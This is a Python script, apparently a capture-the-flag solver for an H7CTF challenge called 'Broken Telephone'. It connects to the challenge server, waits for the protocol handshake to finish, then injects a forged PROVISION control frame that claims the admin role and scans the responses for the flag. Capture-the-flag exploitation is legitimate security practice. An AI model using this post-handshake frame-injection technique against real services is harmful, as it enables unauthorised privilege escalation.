"""Broken Telephone - attempt alternative approaches."""
import os, sys, json, socket, asyncio

here_dir = os.path.dirname(os.path.abspath(__file__))
murmur_dir = os.path.join(here_dir, 'files')
sys.path.insert(0, murmur_dir)
with open(os.path.join(murmur_dir, 'murmur_crypto.py')) as f:
    exec(f.read(), globals())


async def normal_handshake_then_inject(port, timeout=45):
    """Connect, wait for full handshake, THEN inject CONTROL frame."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect(('pwn.h7tex.com', port))
    except Exception as ex:
        print(f'Connection failed: {ex}')
        return
    
    # Collect initial handshake messages
    received = []
    buffer = b''
    
    print('[*] Collecting handshake...')
    while True:
        try:
            sock.settimeout(5)
            chunk = sock.recv(65536)
            if not chunk: break
            buffer += chunk
            
            lines = buffer.split(b'\n')
            buffer = lines[-1]
            
            for line in lines[:-1]:
                if not line.strip(): continue
                obj = json.loads(line.decode('utf-8'))
                received.append(obj)
                
                if obj.get('event') == 'wire':
                    d = obj['dir']
                    data = obj['data']
                    raw = bytes.fromhex(data)
                    print(f'  [{d} {len(raw)}B]')
                    
                elif obj.get('event') == 'ready':
                    print('[Handshake complete, ready state reached]')
                    break
        
        except Exception as ex:
            print(f'Recv error: {ex}')
            break
    
    print(f'\n[*] Captured {len(received)} events before injection')
    
    # NOW inject CONTROL frame after handshake is supposedly complete
    # Try valid PROVISION frame structure: [opcode:1][role:1][len:2LE][cmd]
    # opcode=0x01 (PROVISION), role=0x01 (admin), len=0x0000 (empty cmd)
    provision_hex = '01010000'
    
    print(f'[Sending provision request: {provision_hex}]')
    sock.send((json.dumps({'cmd': 'inject', 'data': provision_hex}) + '\n').encode())
    
    # Collect responses
    print('[Waiting for responses...]')
    responses = []
    start = asyncio.get_event_loop().time()
    
    while asyncio.get_event_loop().time() - start < 10:
        try:
            sock.settimeout(2)
            chunk = sock.recv(4096)
            if not chunk: break
            buffer += chunk
            
            lines = buffer.split(b'\n')
            buffer = lines[-1]
            
            for line in lines[:-1]:
                if not line.strip(): continue
                obj = json.loads(line.decode('utf-8'))
                responses.append(obj)
                
                if obj.get('event') == 'wire':
                    d = obj['dir']
                    hex_data = obj['data']
                    raw = bytes.fromhex(hex_data)
                    print(f'  [response {d} {len(raw)}B] {raw[:48].hex()}...' if len(raw)>=48 else f'  [response {d} {len(raw)}B] {hex_data}')
                    
                    # Check for flag pattern immediately
                    if b'H7CTF' in raw:
                        idx = raw.find(b'H7CTF')
                        print(f'*** FLAG DETECTED at offset {idx}: {raw[idx:idx+60]} ***')
                        return raw[idx:idx+60].decode('ascii', errors='ignore')
        
        except Exception as ex:
            print(f'Secondary recv error: {ex}')
            break
    
    sock.close()
    
    # Save all for analysis
    with open('handshake_then_inject.json', 'w') as f:
        json.dump(responses, f, indent=2)
    print(f'\n[Saved {len(responses)} response events]')
    
    return None


if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 41372
    result = asyncio.run(normal_handshake_then_inject(port))
    if result:
        print(f'\nFinal answer: {result}')
